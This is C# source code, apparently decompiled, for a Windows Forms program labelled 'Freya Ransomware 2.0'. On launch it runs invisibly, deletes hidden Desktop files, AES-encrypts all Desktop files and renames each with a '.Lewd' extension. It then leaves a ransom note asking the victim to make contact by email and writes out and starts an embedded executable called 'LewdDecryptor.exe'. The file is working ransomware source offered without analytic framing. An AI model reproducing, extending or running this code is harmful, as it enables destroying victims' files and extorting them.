using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Freya_Ransomware_2._0.Properties;

namespace Freya_Ransomware_2._0;

public class Form1 : Form
{
	private int filecounter = 0;

	private string hashx = "";

	private string encPath = "C:\\Users\\" + Environment.UserName;

	private string desktoppath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

	private string base64;

	private byte[] bytes;

	private byte[] IV = new byte[16]
	{
		1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
		11, 12, 13, 14, 15, 16
	};

	private int BlockSize = 128;

	private IContainer components = null;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public Form1()
	{
		InitializeComponent();
	}

	private string GetRandom(int lenght)
	{
		string text = "0123456789abcdefghijklmnoprstuvyzABCDEFGHIJKLMNOPRSTUVYZБбВвГгДдЁёЖжЗзИиЙйЛлПпУуФфЦцЧчШшЩщЪъЫыЬьЭэЮюЯяㄱㄲㄴㄷㄸㄹㅁㅂㅃㅅㅆㅇㅈㅉㅊㅋㅌㅍㅎΑΒΓΔΕΖΗΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩβγδεζηθικλμνξοπρσςτυφχψω";
		Random random = new Random((int)DateTime.Now.Ticks);
		string text2 = "";
		for (int i = 0; i < lenght; i++)
		{
			text2 = (hashx = text2 + text[random.Next(0, text.Length - 1)]);
		}
		return text2;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		_ = Assembly.GetExecutingAssembly().Location;
		hashx = GetRandom(128);
		File.Create("C:\\users\\" + Environment.UserName + "\\Desktop\\Key.txt").Dispose();
		File.WriteAllText("C:\\users\\" + Environment.UserName + "\\Desktop\\Key.txt", hashx);
		string[] array = (from f in Directory.EnumerateFiles(desktoppath + "\\")
			where (new FileInfo(f).Attributes & FileAttributes.Hidden) == FileAttributes.Hidden
			select f).ToArray();
		string[] array2 = array;
		foreach (string path in array2)
		{
			File.Delete(path);
		}
		try
		{
			string[] files = Directory.GetFiles("C:\\Users\\" + Environment.UserName + "\\Desktop\\", " *.* ", SearchOption.AllDirectories);
			string[] array3 = files;
			foreach (string text in array3)
			{
				filecounter++;
				byte[] array4 = File.ReadAllBytes(text);
				SymmetricAlgorithm symmetricAlgorithm = Aes.Create();
				HashAlgorithm hashAlgorithm = MD5.Create();
				symmetricAlgorithm.BlockSize = BlockSize;
				symmetricAlgorithm.Key = hashAlgorithm.ComputeHash(Encoding.Unicode.GetBytes(hashx));
				symmetricAlgorithm.IV = IV;
				using MemoryStream memoryStream = new MemoryStream();
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, symmetricAlgorithm.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(array4, 0, array4.Length);
				}
				File.WriteAllBytes(text, memoryStream.ToArray());
				File.Move(text, text + ".Lewd");
			}
		}
		catch (Exception)
		{
		}
		File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\ReadMe.txt").Dispose();
		File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\ReadMe.txt", "CONTACT ME FROM THİS EMAIL");
		File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\YourAttackPath.txt").Dispose();
		File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\YourAttackPath.txt", encPath);
		File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\EncCount.txt").Dispose();
		File.WriteAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\EncCount.txt", Convert.ToString(filecounter));
		base64 = Resources.Base64;
		bytes = Convert.FromBase64String(base64);
		File.Create("C:\\Users\\" + Environment.UserName + "\\Desktop\\LewdDecryptor.exe").Dispose();
		File.WriteAllBytes("C:\\Users\\" + Environment.UserName + "\\Desktop\\LewdDecryptor.exe", bytes);
		Process.Start("C:\\Users\\" + Environment.UserName + "\\Desktop\\LewdDecryptor.exe");
		Application.Exit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
